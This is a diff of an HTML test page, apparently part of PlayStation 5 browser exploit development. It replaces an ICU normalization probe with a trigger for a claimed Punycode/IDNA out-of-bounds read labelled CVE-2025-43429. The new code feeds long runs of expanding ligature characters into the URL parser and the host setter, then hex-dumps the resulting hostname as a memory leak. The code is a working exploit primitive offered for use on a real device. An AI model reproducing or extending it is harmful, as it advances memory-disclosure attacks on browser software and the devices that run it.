@@ -2,137 +2,95 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 ICU Behavior Probe</title>
+<title>PS5 CVE-2025-43429 - High Expansion Punycode Overflow</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-L('[*] Starting ICU Behavior Probe...');
+L('[*] Starting CVE-2025-43429 High Expansion Punycode Overflow...');
 
-// Probe 1: ICU version info
-L('\n--- ICU Version Info ---');
-try {
-    let dtf = new Intl.DateTimeFormat();
-    L('Locale: ' + dtf.resolvedOptions().locale);
-    L('Calendar: ' + dtf.resolvedOptions().calendar);
-    L('NumberingSystem: ' + dtf.resolvedOptions().numberingSystem);
-} catch(e) {
-    L('Error: ' + e.message);
-}
-
-// Probe 2: Test normalization of strings that are "almost normalized"
-// If isNormalized returns true, we skip allocation entirely
-// We need isNormalized to return FALSE, but the two-pass normalize to have a size discrepancy
-L('\n--- Normalization Edge Cases ---');
-
-// Hangul Jamo: these compose and decompose in complex ways
-const hangulTests = [
-    '\u1100\u1161',  // Jamo that compose to 가
-    '\u1100\u1161\u1100\u1161',  // Repeated Jamo
-    '\u1100\u1161'.repeat(100),  // Many Jamo
-    '\uAC00'.repeat(100),  // Precomposed Hangul
-    '\u1100\u1161\u11A8',  // Jamo with trailing consonant
-    '\u1100\u1161\u11A8'.repeat(100),  // Many with trailing consonant
+// Characters that expand massively in Punycode/IDNA
+const expanders = [
+    { name: 'FB03 (ffi, 3x)', char: '\uFB03' },
+    { name: 'FB01 (fi, 2x)', char: '\uFB01' },
+    { name: '212B (Angstrom, 2x)', char: '\u212B' },
+    { name: '3371 (hPa, 3x)', char: '\u3371' },
 ];
 
-for (const str of hangulTests) {
-    for (const form of ['NFC', 'NFD', 'NFKC', 'NFKD']) {
+for (const exp of expanders) {
+    L('\n--- Testing ' + exp.name + ' ---');
+    
+    // Test sizes from 500 to 1500
+    for (let size = 500; size <= 1500; size += 100) {
         try {
-            let res = str.normalize(form);
-            let ratio = (res.length / str.length).toFixed(2);
-            if (res.length !== str.length) {
-                L(`Hangul ${form}: ${str.length} -> ${res.length} (ratio: ${ratio})`);
+            let domain = exp.char.repeat(size) + '.com';
+            let url = new URL('http://' + domain);
+            
+            let hn = url.hostname;
+            L('[+] Size ' + size + ': OK. Hostname length: ' + hn.length);
+            
+            // If hostname length > 2048, we definitely triggered the OOB read
+            if (hn.length > 2048) {
+                L('[!] OVER 2048! OOB READ CONFIRMED!');
+                let hex = [];
+                for (let i = 0; i < hn.length; i++) {
+                    hex.push(hn.charCodeAt(i).toString(16).padStart(2, '0'));
+                }
+                L('[!] Hex dump (last 100 chars): ' + hex.slice(-100).join(' '));
+                L('[!] THIS IS THE LEAK!');
+                break;
             }
-        } catch(e) {}
-    }
-}
-
-// Probe 3: Tibetan - notorious for ICU normalization bugs
-L('\n--- Tibetan Normalization ---');
-const tibetanTests = [
-    '\u0F73',  // Tibetan vowel I
-    '\u0F73'.repeat(100),
-    '\u0F71\u0F72',  // Tibetan subjoined vowel
-    '\u0F71\u0F72'.repeat(100),
-    '\u0F0B\u0F73',  // Tibetan tshek + vowel
-    '\u0F0B\u0F73'.repeat(100),
-];
-
-for (const str of tibetanTests) {
-    for (const form of ['NFC', 'NFD', 'NFKC', 'NFKD']) {
-        try {
-            let res = str.normalize(form);
-            if (res.length !== str.length) {
-                L(`Tibetan ${form}: ${str.length} -> ${res.length}`);
+            
+            // Check for anomalies (non-ASCII or control chars in Punycode)
+            let anomalies = 0;
+            for (let i = 0; i < hn.length; i++) {
+                let code = hn.charCodeAt(i);
+                if (code > 127 || (code < 32 && code !== 45 && code !== 46)) {
+                    anomalies++;
+                }
             }
-        } catch(e) {}
-    }
-}
-
-// Probe 4: CJK Compatibility Ideographs - these map to standard CJK
-// and can cause size discrepancies in some ICU versions
-L('\n--- CJK Compatibility Ideographs ---');
-const cjkCompatTests = [
-    '\uF900',  // CJK Compatibility Ideograph
-    '\uF900'.repeat(100),
-    '\uFA30',  // CJK Compatibility Ideograph Supplement
-    '\uFA30'.repeat(100),
-];
-
-for (const str of cjkCompatTests) {
-    for (const form of ['NFC', 'NFD', 'NFKC', 'NFKD']) {
-        try {
-            let res = str.normalize(form);
-            if (res.length !== str.length) {
-                L(`CJKCompat ${form}: ${str.length} -> ${res.length}`);
+            if (anomalies > 0) {
+                L('[!] ANOMALIES DETECTED! ' + anomalies + ' non-ASCII chars!');
             }
-        } catch(e) {}
-    }
-}
-
-// Probe 5: Strings that cause ICU to report U_STRING_NOT_TERMINATED_WARNING
-// This warning is > U_ZERO_ERROR, so U_SUCCESS returns false
-// BUT: the buffer might still be partially written
-L('\n--- Warning Behavior Test ---');
-// Try strings that might cause warnings but not errors
-const warningTests = [
-    '\uFDFA'.repeat(1),
-    '\uFDFA'.repeat(10),
-    '\uFDFA'.repeat(50),
-    '\uFDFA'.repeat(100),
-    '\uFDFA'.repeat(200),
-    '\uFDFA'.repeat(500),
-    '\uFDFA'.repeat(1000),
-];
-
-for (const str of warningTests) {
-    try {
-        let res = str.normalize('NFKC');
-        L(`FDFA x${str.length}: -> ${res.length} (ratio: ${(res.length/str.length).toFixed(2)})`);
-    } catch(e) {
-        L(`FDFA x${str.length}: threw ${e.name}`);
-    }
-}
-
-// Probe 6: Try to find the exact URL length limit
-L('\n--- URL Length Limit Probe ---');
-for (let len = 1000; len <= 1200; len += 5) {
-    try {
-        let domain = '';
-        for (let i = 0; i < len; i++) {
-            domain += String.fromCharCode(0x4E00 + (i % 100));
+            
+        } catch (e) {
+            if (e.message.includes('cannot be parsed')) {
+                L('[-] Size ' + size + ': Rejected by URL parser');
+            } else {
+                L('[!] Size ' + size + ': ERROR: ' + e.message);
+            }
         }
-        let url = new URL('http://' + domain + '.com');
-        L(`URL len=${len}: OK, hostname=${url.hostname.length}`);
-    } catch(e) {
-        L(`URL len=${len}: REJECTED`);
-        break;
     }
 }
 
-L('\n[*] Probe finished.');
+// Also try via URL.host setter
+L('\n--- Testing via URL.host setter ---');
+for (const exp of expanders) {
+    L('\n--- Setter: ' + exp.name + ' ---');
+    try {
+        let domain = exp.char.repeat(1000) + '.com';
+        let url = new URL('http://example.test/');
+        url.host = domain;
+        
+        let hn = url.hostname;
+        L('[+] Setter size 1000: OK. Hostname length: ' + hn.length);
+        
+        if (hn.length > 2048) {
+            L('[!] SETTER OVER 2048! OOB READ CONFIRMED!');
+            let hex = [];
+            for (let i = 0; i < hn.length; i++) {
+                hex.push(hn.charCodeAt(i).toString(16).padStart(2, '0'));
+            }
+            L('[!] Hex dump (last 100 chars): ' + hex.slice(-100).join(' '));
+        }
+    } catch (e) {
+        L('[!] Setter threw: ' + e.message);
+    }
+}
+
+L('\n[*] Test finished.');
 </script>
 </body>
 </html>
